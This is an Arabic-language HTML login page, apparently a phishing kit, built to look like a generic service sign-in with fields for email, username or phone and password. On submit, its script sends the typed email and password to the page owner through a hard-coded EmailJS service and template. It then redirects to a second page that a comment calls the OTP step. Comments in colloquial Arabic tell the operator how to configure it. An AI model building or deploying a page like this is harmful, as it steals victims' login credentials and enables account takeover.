<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Cairo', sans-serif;
        }

        body {
            background: linear-gradient(180deg, #18233a 0%, #1c315e 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .header {
            width: 100%;
            padding: 20px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #a0aec0;
        }

        .logo-container {
            margin-top: 40px;
            margin-bottom: 30px;
        }

        .logo-container img {
            width: 100px;
            height: auto;
        }

        .login-container {
            width: 90%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
        }

        .login-title {
            text-align: right;
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: 700;
        }

        .input-group {
            position: relative;
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            background-color: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 12px;
            padding: 18px 45px 18px 15px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
        }

        .input-group input::placeholder {
            color: #a0aec0;
        }

        .input-icon-right {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #a0aec0;
            font-size: 18px;
        }

        .input-icon-left {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #a0aec0;
            font-size: 18px;
            cursor: pointer;
        }

        .forgot-password {
            text-align: right;
            font-size: 13px;
            color: #a0aec0;
            margin-bottom: 25px;
            margin-top: -5px;
        }

        .forgot-password a {
            color: #a0aec0;
            text-decoration: none;
        }

        .buttons-row {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }

        .btn-qr {
            background-color: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 12px;
            width: 60px;
            height: 55px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #ffffff;
            font-size: 24px;
            cursor: pointer;
        }

        .btn-submit {
            background-color: #4da8fa;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            flex-grow: 1;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn-submit:hover {
            background-color: #3b91e0;
        }

        .btn-submit:disabled {
            background-color: #a0aec0;
            cursor: not-allowed;
        }

        .create-account {
            text-align: center;
            font-size: 13px;
            color: #a0aec0;
        }

        .create-account a {
            color: #a0aec0;
            text-decoration: none;
        }

        .footer {
            margin-top: auto;
            padding-bottom: 30px;
            text-align: center;
            color: #a0aec0;
            font-size: 12px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }
    </style>
</head>
<body>

    <div class="header">
        <span>الإنكليزية</span>
        <i class="fa-solid fa-headset"></i>
    </div>

    <div class="logo-container">
        <img id="dynamic-logo" src="https://i.imgur.com/WnTTBP5.png" alt="Logo">
    </div>

    <div class="login-container">
        <h1 class="login-title">تسجيل الدخول</h1>

        <form id="login-form">
            <div class="input-group">
                <i class="fa-solid fa-user input-icon-right"></i>
                <input type="text" id="email" placeholder="البريد الإلكتروني، اسم المستخدم أو رقم الهاتف" required>
            </div>

            <div class="input-group">
                <i class="fa-solid fa-lock input-icon-right"></i>
                <input type="password" id="password" placeholder="كلمة السر" required>
                <i class="fa-solid fa-eye input-icon-left" id="togglePassword"></i>
            </div>

            <div class="forgot-password">
                <a href="#">هل نسيت كلمة المرور؟ تغيير كلمة المرور</a>
            </div>

            <div class="buttons-row">
                <button type="button" class="btn-qr">
                    <i class="fa-solid fa-qrcode"></i>
                </button>
                <button type="submit" class="btn-submit" id="submit-btn">تسجيل الدخول</button>
            </div>

            <div class="create-account">
                <a href="#">لا تملك حساب مسبقا؟ إنشاء حساب</a>
            </div>
        </form>
    </div>

    <div class="footer">
        <span>POWERED BY</span>
        <i class="fa-solid fa-shield-halved" style="font-size: 30px;"></i>
        <span>V 2.2.6</span>
    </div>

    <script>
        // 1. إظهار وإخفاء كلمة المرور
        const togglePassword = document.querySelector('#togglePassword');
        const passwordInput = document.querySelector('#password');

        togglePassword.addEventListener('click', function () {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.classList.toggle('fa-eye-slash');
            this.classList.toggle('fa-eye');
        });

        // 2. إعدادات EmailJS (تأكد من الـ Public Key)
        // حط الـ Public Key تبعك هون وتأكد إنه ما فيه مسافات بالغلط
        emailjs.init("alrQnYhW4_ClmRT22");

        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault(); 

            const submitBtn = document.getElementById('submit-btn');
            const originalText = submitBtn.innerText;
            
            // تغيير حالة الزر لمنع الضغط المتكرر
            submitBtn.innerText = 'جاري التحميل...';
            submitBtn.disabled = true;

            // المتغيرات اللي رح تنبعث (لازم تطابق الـ Template بالضبط)
            const templateParams = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            // إرسال البيانات
            emailjs.send("service_fpgakvm", "template_0tnijuj", templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    submitBtn.innerText = 'تم بنجاح!';
                    
                    // توجيه المستخدم لصفحة الـ OTP
                    setTimeout(() => {
                        window.location.href = "int.html"; 
                    }, 500);
                    
                })
                .catch(function(error) {
                    console.error('FAILED...', error);
                    // استرجاع حالة الزر
                    submitBtn.innerText = originalText;
                    submitBtn.disabled = false;
                    
                    // إظهار رسالة تفصيلية بالخطأ عشان تعرف تصلحه
                    const errorMessage = error.text || error.message || "تأكد من إعدادات EmailJS";
                    alert("فشل الإرسال. تفاصيل الخطأ:\n" + errorMessage);
                });
        });
    </script>
</body>
</html>
